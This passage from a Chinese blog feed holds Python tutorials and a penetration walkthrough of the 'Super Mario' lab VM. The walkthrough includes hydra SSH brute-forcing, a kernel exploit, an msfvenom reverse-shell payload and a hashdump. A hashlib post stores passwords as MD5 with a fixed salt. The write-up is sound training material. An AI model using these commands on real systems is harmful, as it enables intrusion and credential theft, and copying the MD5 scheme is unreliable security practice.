<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; python的hashlib提供了常见的摘要算法，如MD5,SHA1等</span><br><span class="line">&gt; 摘要算法又称为hash算法、散列算法。它通过一个函数把任意长度的数据转换为一个长度的固定的数据串（通常用十六进制字符串表示）</span><br><span class="line">&gt; 摘要算法反推很困难，因为摘要函数是单向的，对原始数据做一个bit的修改，都会导致计算出的摘要完全不同</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="hashlib模块学习"><a href="#hashlib模块学习" class="headerlink" title="hashlib模块学习"></a>hashlib模块学习</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">md5.update(<span class="string">'how to use md5 in python hashlib?'</span>)</span><br><span class="line"><span class="comment">#使用生成实例的update方法进行MD5的转换，同时，update会将每次的字符串拼接，如果想要不同的值，每次过后都得实例化</span></span><br><span class="line"><span class="keyword">print</span> md5.hexdigest()   <span class="comment">#返回摘要信息，以十六进制数据返回</span></span><br><span class="line"><span class="keyword">print</span> md5.digest()      <span class="comment">#返回摘要信息，以二进制数据返回</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#刚才说过的update，如果数据量很大，可以使用它拼接</span></span><br><span class="line"><span class="comment">#MD5是最常见的摘要算法，速度很快，生成结果是固定的128 bit字节，通常用一个32位的16进制字符串表示</span></span><br><span class="line">md52 = hashlib.md5()</span><br><span class="line">md5.update(<span class="string">'how to use md5 in'</span>)</span><br><span class="line">md5.update(<span class="string">'python hashlib?'</span>)</span><br><span class="line"><span class="keyword">print</span> md5.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="comment">#SHA1的结果是160 bit字节，通常用一个40位的16进制字符串表示</span></span><br><span class="line"><span class="comment">#有没有可能两个不同的数据通过某个摘要算法得到了相同的摘要？完全有可能，因为任何摘要算法都是把无限多的数据集合映射到一个有限的集合中。这种情况称为碰撞</span></span><br><span class="line">sha1 = hashlib.sha1()</span><br><span class="line">sha1.update(<span class="string">'how to use sha1 in '</span>)</span><br><span class="line">sha1.update(<span class="string">'python hashlib?'</span>)</span><br><span class="line"><span class="keyword">print</span> sha1.hexdigest()</span><br></pre></td></tr></table></figure>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>1.进行hash爆破：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span>  hashlib</span><br><span class="line"></span><br><span class="line">a = string.digits + string.lowercase + string.uppercase</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> a:</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> a:</span><br><span class="line">                s = hashlib.md5(i+j+k+m).hexdigest()[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line">                <span class="keyword">if</span> s == <span class="string">'9bf514'</span>:</span><br><span class="line">                    <span class="keyword">print</span> i+j+k+m</span><br></pre></td></tr></table></figure>
<p>2.用hashlib模拟用户登录，以及password值加盐存储：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> re, hashlib</span><br><span class="line">dic = &#123; <span class="string">'syq123'</span>: <span class="string">'506420d6fc050439850f1cb80eb70b9c'</span>,</span><br><span class="line">        <span class="string">'feifei'</span>: <span class="string">'f95f65d787a87a5e3d32c61b3f7e9bec'</span>,</span><br><span class="line">        <span class="string">'zsg123'</span>: <span class="string">'87c34b8d2950946df7a987a990cad99f'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_md5</span><span class="params">(password)</span>:</span></span><br><span class="line">    md5 = hashlib.md5()</span><br><span class="line">    md5.update(password)</span><br><span class="line">    <span class="keyword">return</span> md5.hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Salt_get_md5</span><span class="params">(password,name)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> get_md5(password + name + <span class="string">'salt'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">username</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#创建用户</span></span><br><span class="line">    name = raw_input(<span class="string">'please input your username!!'</span>)</span><br><span class="line">    <span class="keyword">if</span> re.match(<span class="string">r'^[a-zA-Z].&#123;2,9&#125;'</span>,name):</span><br><span class="line">        userpassword(name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'input error!'</span></span><br><span class="line">        username()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">userpassword</span><span class="params">(name)</span>:</span></span><br><span class="line">    password = raw_input(<span class="string">'please input your password:'</span>)</span><br><span class="line">    password = Salt_get_md5(password,name)</span><br><span class="line">    <span class="keyword">print</span> password</span><br><span class="line">    dic[name] = password    <span class="comment">#这里如果用update方法时会出现一个问题，添加进字典的不是变量对应的值，而是输入的变量名称</span></span><br><span class="line">    <span class="keyword">print</span> dic</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    str = <span class="string">'Please Login'</span></span><br><span class="line">    <span class="keyword">print</span> str.center(<span class="number">25</span>)</span><br><span class="line">    name = raw_input(<span class="string">'please input your username:'</span>)</span><br><span class="line">    password = raw_input(<span class="string">'please input your password:'</span>)</span><br><span class="line">    password = Salt_get_md5(password,name)</span><br><span class="line">    <span class="keyword">if</span> dic[name] == password:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Login Success!'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Login faild! username or password error!'</span></span><br><span class="line">        login()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    ch = raw_input(<span class="string">'请选择1或2:1-&gt;登录，2-&gt;注册'</span>)</span><br><span class="line">    <span class="comment"># print type(ch)</span></span><br><span class="line">    <span class="keyword">if</span> ch == <span class="string">'1'</span>:</span><br><span class="line">        login()</span><br><span class="line">    <span class="keyword">elif</span> ch == <span class="string">'2'</span>:</span><br><span class="line">        username()</span><br><span class="line">        ch = raw_input(<span class="string">'请选择1或2:1-&gt;登录，2-&gt;退出'</span>)</span><br><span class="line">        <span class="keyword">if</span> ch == <span class="string">'1'</span>:</span><br><span class="line">            login()</span><br><span class="line">        <span class="keyword">elif</span> ch ==<span class="string">'2'</span>:</span><br><span class="line">            exit(<span class="string">'bye!!!'</span>)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>编程</tag>
        <tag>hashlib</tag>
      </tags>
  </entry>
  <entry>
    <title>python字符操作</title>
    <url>/2018/08/29/python%E5%AD%97%E7%AC%A6%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<h3 id="字符串操作需求"><a href="#字符串操作需求" class="headerlink" title="字符串操作需求"></a>字符串操作需求</h3><blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; string模块定义了一些常用的属性（包含所有的数字，字母，可打印的所有ascii码等）</span><br><span class="line">&gt; python的字符串操作可以通过两部分的方法函数基本上就可以解决所有的字符串操作需求：</span><br><span class="line">&gt; 1.python的字符串属性函数</span><br><span class="line">&gt; 2.python的string模块</span><br><span class="line">&gt; 一次python对字符的操作，人生苦短!</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="文档练习实例如下："><a href="#文档练习实例如下：" class="headerlink" title="文档练习实例如下："></a>文档练习实例如下：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">string模块定义了一些常用的属性（包含所有的数字，字母，可打印的所有ascii码等）</span></span><br><span class="line"><span class="string">python的字符串操作可以通过两部分的方法函数基本上就可以解决所有的字符串操作需求：</span></span><br><span class="line"><span class="string">1.python的字符串属性函数</span></span><br><span class="line"><span class="string">2.python的string模块</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="comment">#1.字符串输出格式对齐</span></span><br><span class="line"> </span><br><span class="line">str = <span class="string">'PyTHON heLLo'</span></span><br><span class="line"><span class="keyword">print</span> str.center(<span class="number">20</span>)  <span class="comment">#生成20个字符长度，str处于中间位置</span></span><br><span class="line"><span class="keyword">print</span> str.ljust(<span class="number">20</span>)   <span class="comment">#生成20个字符，str左对齐</span></span><br><span class="line"><span class="keyword">print</span> str.rjust(<span class="number">20</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#2.大小写转换</span></span><br><span class="line"><span class="keyword">print</span> str.upper()   <span class="comment">#转大写</span></span><br><span class="line"><span class="keyword">print</span> str.lower()   <span class="comment">#转小写</span></span><br><span class="line"><span class="keyword">print</span> str.capitalize()  <span class="comment">#字符串首字母大写，其余小写</span></span><br><span class="line"><span class="keyword">print</span> str.swapcase()    <span class="comment">#大小写对换</span></span><br><span class="line"><span class="keyword">print</span> str.title()       <span class="comment">#以分隔符为标记，首字符为大写，其余为小写</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#3.字符串判断条件</span></span><br><span class="line">str1 = <span class="string">'01234'</span></span><br><span class="line"><span class="keyword">print</span> str1.isalnum()   <span class="comment">#判断是否全是数字和字母，并至少有一个字符</span></span><br><span class="line"><span class="keyword">print</span> str1.isdigit()   <span class="comment">#判断是否全是数字，并至少有一个字符</span></span><br><span class="line"> </span><br><span class="line">str2 = <span class="string">'string'</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> str2.isalnum()   <span class="comment">#判断是否全是数字或字母，并至少有一个字符</span></span><br><span class="line"><span class="keyword">print</span> str2.isalpha()   <span class="comment">#判断是否全是字母，并至少有一个字符</span></span><br><span class="line"><span class="keyword">print</span> str2.islower()   <span class="comment">#判断是否全是小写字母，当全是小写和数字的组合时也会返回True</span></span><br><span class="line"><span class="keyword">print</span> str2.isspace()   <span class="comment">#判断是否全是空白字符，并至少有一个字符</span></span><br><span class="line"><span class="keyword">print</span> str2.isspace()   <span class="comment">#判断是否全是大写，如果全是大写和数字也会返回True</span></span><br><span class="line"><span class="keyword">print</span> str2.istitle()   <span class="comment">#判断是否每个单词的首字母为大写</span></span><br><span class="line"><span class="keyword">print</span> str2.startswith(<span class="string">'str'</span>)  <span class="comment">#判断字符是否以str开头</span></span><br><span class="line"><span class="keyword">print</span> str2.endswith(<span class="string">'ing'</span>)    <span class="comment">#判断字符是否以ing结尾</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#4.字符串搜索定位与替换</span></span><br><span class="line">str3 = <span class="string">'string IEarn'</span></span><br><span class="line"><span class="keyword">print</span> str3.find(<span class="string">'z'</span>) <span class="comment">#查找字符串，没有则返回-1，有则返回查找到的第一个索引</span></span><br><span class="line"><span class="keyword">print</span> str3.rfind(<span class="string">'n'</span>) <span class="comment">#返回索引的最后一次匹配</span></span><br><span class="line"><span class="keyword">print</span> str3.index(<span class="string">'s'</span>) <span class="comment">#没有匹配则报错，如果匹配到则和find类似，返回第一次索引</span></span><br><span class="line"><span class="keyword">print</span> str3.count(<span class="string">'a'</span>) <span class="comment">#返回字符串中匹配的次数</span></span><br><span class="line"><span class="keyword">print</span> str3.replace(<span class="string">'n'</span>,<span class="string">'N'</span>)  <span class="comment">#搜索替换</span></span><br><span class="line"><span class="keyword">print</span> str3.strip(<span class="string">'n'</span>)  <span class="comment">#删除字符串首尾匹配的字符，通常用于默认删除回车符</span></span><br><span class="line"><span class="keyword">print</span> str3.lstrip(<span class="string">'n'</span>) <span class="comment">#左配符</span></span><br><span class="line"><span class="keyword">print</span> str3.rstrip(<span class="string">'n'</span>) <span class="comment">#右配符</span></span><br><span class="line"> </span><br><span class="line">str4 = <span class="string">'tab'</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> str4.expandtabs() <span class="comment">#把制表符转换为空格</span></span><br><span class="line"><span class="keyword">print</span> str4.expandtabs(<span class="number">5</span>)<span class="comment">#指定空格数</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#5.字符串编码与解码</span></span><br><span class="line"> </span><br><span class="line">str5 = <span class="string">"字符串学习"</span></span><br><span class="line"><span class="keyword">print</span> str5</span><br><span class="line"><span class="keyword">print</span> str5.decode(<span class="string">'utf-8'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#6.字符串分割变换</span></span><br><span class="line"> </span><br><span class="line">str6 = <span class="string">'Learn string'</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'-'</span>.join(str6)</span><br><span class="line"> </span><br><span class="line">str7 = [<span class="string">'Learn'</span>,<span class="string">'string'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'-'</span>.join(str7)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> str6.split(<span class="string">'n'</span>)</span><br><span class="line"><span class="keyword">print</span> str6.split(<span class="string">'n'</span>,<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> str6.rstrip(<span class="string">'n'</span>)</span><br><span class="line"><span class="keyword">print</span> str6.rsplit(<span class="string">'n'</span>,<span class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span> str6.splitlines()</span><br><span class="line"><span class="keyword">print</span> str6.partition(<span class="string">'n'</span>)</span><br><span class="line"><span class="keyword">print</span> str6.rpartition(<span class="string">'n'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#7.打印出一些常用的字符</span></span><br><span class="line"><span class="keyword">print</span> string.letters</span><br><span class="line"><span class="keyword">print</span> string.ascii_letters  <span class="comment">#两个都是打印出大小写字母</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> string.lowercase</span><br><span class="line"><span class="keyword">print</span> string.ascii_lowercase <span class="comment">#打印小写字母</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> string.uppercase</span><br><span class="line"><span class="keyword">print</span> string.ascii_uppercase <span class="comment">#打印大写字母</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> string.digits      <span class="comment">#打印十进制数字</span></span><br><span class="line"><span class="keyword">print</span> string.octdigits   <span class="comment">#打印八进制数字</span></span><br><span class="line"><span class="keyword">print</span> string.hexdigits   <span class="comment">#打印十六进制数字</span></span><br><span class="line"><span class="keyword">print</span> string.printable   <span class="comment">#打印数字，大小写字母和特殊字符</span></span><br><span class="line"><span class="keyword">print</span> string.punctuation <span class="comment">#打印特殊字符</span></span><br><span class="line"><span class="keyword">print</span> string.whitespace  <span class="comment">#打印一些如制表符一样的符号</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#8.string中定义的方法</span></span><br><span class="line"><span class="string">"string.capwords(s, sep=None)是多个字符串方法的组合split(),capitalize(),join()"</span></span><br><span class="line">s = <span class="string">'ahelloaworld'</span></span><br><span class="line"><span class="keyword">print</span> string.capwords(s, <span class="string">'a'</span>)</span><br><span class="line"><span class="comment">#等价于：</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'a'</span>.join([i.capitalize() <span class="keyword">for</span> i <span class="keyword">in</span> s.split(<span class="string">'a'</span>)])</span><br><span class="line"> </span><br><span class="line"><span class="comment">#实例：生成200的随机优惠券（长度是20位的）</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">key = string.letters + string.digits</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">    k = [random.choice(key) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>)]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">''</span>.join(k)</span><br></pre></td></tr></table></figure>
<h3 id="练习图示："><a href="#练习图示：" class="headerlink" title="练习图示："></a>练习图示：</h3><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1535555956.23.png" alt></p>
]]></content>
      <tags>
        <tag>python</tag>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title>超级玛丽靶机渗透</title>
    <url>/2018/08/19/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<h3 id="靶机渗透"><a href="#靶机渗透" class="headerlink" title="靶机渗透"></a>靶机渗透</h3><blockquote>
<p>以前看到一篇关于靶机渗透的文章，看了一下觉得比较有意思，所以下载下来玩了一下。<a href="https://www.anquanke.com/post/id/146527" target="_blank" rel="noopener">原文链接</a></p>
</blockquote>
<h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><p>靶机IP：192.168.0.105</p>
<p>攻击主机IP：192.168.0.106</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534675443.65.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534675463.94.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534675493.83.png" alt></p>
<h3 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h3><ul>
<li><p>靶机只有一个登陆界面，所以端口扫描来一波</p>
<p><code>nmap.exe -sV -p- -T5 192.168.0.105</code></p>
</li>
<li><p>发现开了22和8180端口，访问一下8180端口，可以访问，就从8180端口入手，发现啥都没有，目录扫描走一波 <code>sudo dirb http://192.168.0.105:8180 /usr/share/dirb/wordlists/big.txt</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534675825.29.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676045.55.png" alt></p>
</li>
<li><p>发现一个vhosts目录，访问以后得到如下信息：发现有服务名，修改本地hosts文件访问一下<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676106.23.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676228.18.png" alt></p>
</li>
<li><p>然后访问[<a href="http://mario.supermariohost.local:8180/" target="_blank" rel="noopener">http://mario.supermariohost.local:8180/</a> 得到如下界面，并没有发现什么有用的信息，再来一次目录扫描（这里说明一下，本来是没有扫到东西的，所以看了一下原文，发现是扫出来的，也许是字典进行了改进，在后文评论中看到马里奥的弟弟是luigi ，emmm。。果然是）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676343.44.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676499.19.png" alt></p>
</li>
<li><p>访问一下地址：发现一串英文，利用cewl对连接进行爬取然后生成一个自定义的字典 ，这里是对一些单词的提取，针对可能有用的进行提取<code>cewl &lt;http://mario.supermariohost.local:8180/&gt; -d -w /root/Desktop/666.txt</code> <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676681.24.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676860.62.png" alt></p>
</li>
<li><p>利用生成的自定义字典使用john生成一个自定义的密码字典 <code>john --wordlist=/home/dest/666.txt --stdout --rules &gt; 777.txt</code> 这里联想到前面的那个目录luigi和生成的密码，然后对22端口进行爆破</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677018.46.png" alt></p>
<p><code>hydra -l luigi -P /home/toml/777.txt 192.168.0.105 ssh -t 20</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677247.99.png" alt></p>
</li>
<li><p>得到ssh的账号密码，进行登录，登录成功以后发现shell权限被限制了，和python进行沙盒逃逸挺像的<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677310.05.png" alt></p>
</li>
<li><p>在原文中有一篇关于内网渗透中绕过shell限制的文章：<a href="http://www.4hou.com/penetration/11674.html" target="_blank" rel="noopener">www.4hou.com/penetration/11674.html</a> ，通过awk ‘BEGIN{system(“/bin/bash”)}’ 绕过限制,由于测试过进行总结，所以靶机再没重启<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677502.15.png" alt></p>
</li>
<li><p>然后进行提权：通过查看内核发现是3.13.0的内核版本，通过公开的提权程序进行提权：<a href="https://www.exploit-db.com/raw/37292/，下载以后是html,修改后缀名进行编译执行" target="_blank" rel="noopener">https://www.exploit-db.com/raw/37292/，下载以后是html,修改后缀名进行编译执行</a> <code>gcc 77.c -o test</code> 拿到root权限</p>
</li>
<li><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677631.83.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677718.08.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677870.96.png" alt></p>
</li>
<li><p>提权成功后在root目录下发现了flag.zip,解压发现需要密码：<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678061.53.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678103.78.png" alt></p>
</li>
<li><p>将靶机上的flag压缩包下载到本地，利用msf生成后门程序，在靶机上下载执行：</p>
<p><code>sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.106 LPORT=7777 -f elf &gt; /var/www/html/5.elf</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678360.95.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678383.77.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678435.94.png" alt></p>
</li>
<li><p>利用fcrackzip爆破压缩包的密码 <code>fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt flag.zip</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678550.51.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678577.38.png" alt></p>
</li>
<li><p>查看flag发现要拿到所有的账户密码，这个时候已经在msf上反弹shell了，所以先把所有的hash抓下来</p>
<p><code>run post/linux/gather/hashdump</code> <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678687.04.png" alt></p>
</li>
<li><p>然后利用刚才破解的压缩包密码生成字典，将密码保存到一个新的文件夹中，然后生成</p>
<p><code>john --wordlist=/home/toml/newpass.txt --stdout --rules &gt; newpasse.txt</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678803.4.png" alt></p>
</li>
<li><p>加载字典，然后本地破解hash，得到所有的账户密码：</p>
<p><code>john --wordlist=/home/toml/newpasse.txt /home/toml/.msf4/loot/20180819175754_default_192.168.0.105_linux.hashes_331263.txt</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678908.77.png" alt></p>
</li>
<li><p>利用得到的账户密码均登陆成功：渗透完成<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534679220.15.png" alt></p>
</li>
</ul>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote>
<p>本次靶机的渗透测试，看了表哥的文章，思路清晰，收获很多，是一次学习的过程。</p>
</blockquote>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>python进程池和线程池</title>
    <url>/2018/06/28/python%E8%BF%9B%E7%A8%8B%E6%B1%A0%E5%92%8C%E7%BA%BF%E7%A8%8B%E6%B1%A0/</url>
    <content><![CDATA[<h2 id="python进程池和线程池学习"><a href="#python进程池和线程池学习" class="headerlink" title="python进程池和线程池学习"></a>python进程池和线程池学习</h2><blockquote>
<p>前几天学习了python的多进程通信，是python标准库中支持的多进程并发模块multiprocessing ，主要学习了它常用的两个类和几种进程间通信的方法，本文基于这一点继续拓展python的并发中的线程池和进程池。</p>
</blockquote>
<h3 id="多进程和多线程"><a href="#多进程和多线程" class="headerlink" title="多进程和多线程"></a>多进程和多线程</h3><blockquote>
<p>按照书上的话来说“进程是资源分配的最小单位，线程是CPU调度的最小单位 ”但在实际中要分清楚它们的区别与联系才可以运用好多线程和多进程。多进程与多线程的区别 进程是程序在计算机上的一次执行活动。当你运行一个程序，你就启动了一个进程。显然，程序是死的(静态的)，进程是活的(动态的)。进程可以分为系统进程和用户进程。凡是用于完成操作系统的各种功能的进程就是系统进程，它们就是处于运行状态下的操作系统本身；所有由你启动的进程都是用户进程。进程是操作系统进行资源分配的单位。在Windows下，进程又被细化为线程，也就是一个进程下有多个能独立运行的更小的单位。 在同一个时间里，同一个计算机系统中如果允许两个或两个以上的进程处于运行状态，这便是多任务。 </p>
</blockquote>
<ul>
<li>先贴一张图来看多线程和多进程再不同维度的对比：<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530154912.57.png" alt></li>
<li>基于上图总结：<ul>
<li>需要频繁创建销毁的优先使用多线程，常见的是web服务器，来一个请求，建立一次连接、通信结束以后销毁连接，所以要使用多线程，如果使用多进程，创建和销毁的代价非常大。</li>
<li>需要进行大量计算的优先使用多线程，由于大量计算需要消耗大量的CPU资源、切换频繁，如图像处理、算法处理，使用多线程切换简单，CPU的利用率高。</li>
<li>处理关系相关性强的优先用多进程、相关性弱的优先用多线程。比如：服务器进行消息的收发和消息的处理，相关性不是很强，使用多进程可以提高并发速度；针对消息的处理有消息解码、业务处理等多种方式，这个时候需要数据间的共享，使用多线程会提高并发速度。</li>
<li>基于分布式的多核多机的优先使用多进程。</li>
<li>满足不同的需求，结合它们的特性选用合理的方式。</li>
</ul>
</li>
</ul>
<h3 id="通过队列实现多线程和多进程的并发"><a href="#通过队列实现多线程和多进程的并发" class="headerlink" title="通过队列实现多线程和多进程的并发"></a>通过队列实现多线程和多进程的并发</h3><ol>
<li><p>使用multiprocessing.JoinableQueue实现多进程并发</p>
<blockquote>
<p>JoinableQueue是multiprocessing的一种数据结构，它本质上是一个FIFO队列，它与一般队列的不同在于它的多进程是安全的，会自动解决互斥和死锁的问题。JoinableQueue主要可以用来存放执行的任务和收集任务的执行结果。 </p>
</blockquote>
<ul>
<li><p>通过多进程并发打印26个字母</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> JoinableQueue</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> random, time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(q)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#这里是多进程并发的要点，q是一个JoinableQueue对象，支持get方法读取第一个元素，如果q中没有元素，进程就会阻塞，直至q中被存入新元素</span></span><br><span class="line">            value = q.get()</span><br><span class="line">            print(<span class="string">'GET &#123;&#125; from queue.'</span>.format(value))</span><br><span class="line">            time.sleep(random.random())</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            q.task_done()</span><br><span class="line"><span class="comment">#通过多进程将26个字母打印出来</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#定义一个存放任务的JoinableQueue对象</span></span><br><span class="line">    q = multiprocessing.JoinableQueue()</span><br><span class="line">    <span class="comment">#实例化两个Process对象（每个对象对应一个子进程）target是实现每个任务工作中的具体函数，args是target函数的参数</span></span><br><span class="line">    pw1 = multiprocessing.Process(target=read, args=(q,))</span><br><span class="line">    pw2 = multiprocessing.Process(target=read, args=(q,))</span><br><span class="line">    <span class="comment">#将子进程设为守护进程———在主进程结束后随之结束</span></span><br><span class="line">    pw1.daemon = <span class="keyword">True</span></span><br><span class="line">    pw2.daemon = <span class="keyword">True</span></span><br><span class="line">    <span class="comment">#子进程就开始独立于父进程运行了，它会在单独的进程里调用target引用的函数——在这里即read函数，它是一个死循环，将参数q中的数一一读取并打印出来</span></span><br><span class="line">    pw1.start()</span><br><span class="line">    pw2.start()</span><br><span class="line">    <span class="comment">#实际上start执行以后进程就阻塞了，由于JoinableQueue对象没有传入元素，等待传入元素才开始执行</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> [chr(ord(<span class="string">'A'</span>)+i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>)]:</span><br><span class="line">        q.put(x)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#这里是查询q中的数据是否已经读完，如果没有读完阻塞程序，等待q中的数据读完才开始继续执行</span></span><br><span class="line">        q.join()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        print(<span class="string">'stopped by hand'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530162034.1.png" alt></p>
</li>
<li><p>通过这个实例可以看出python通过JoinableQueue实现多进程并发的优雅</p>
</li>
</ul>
</li>
<li><p>通过队列实现多线程的并发</p>
<blockquote>
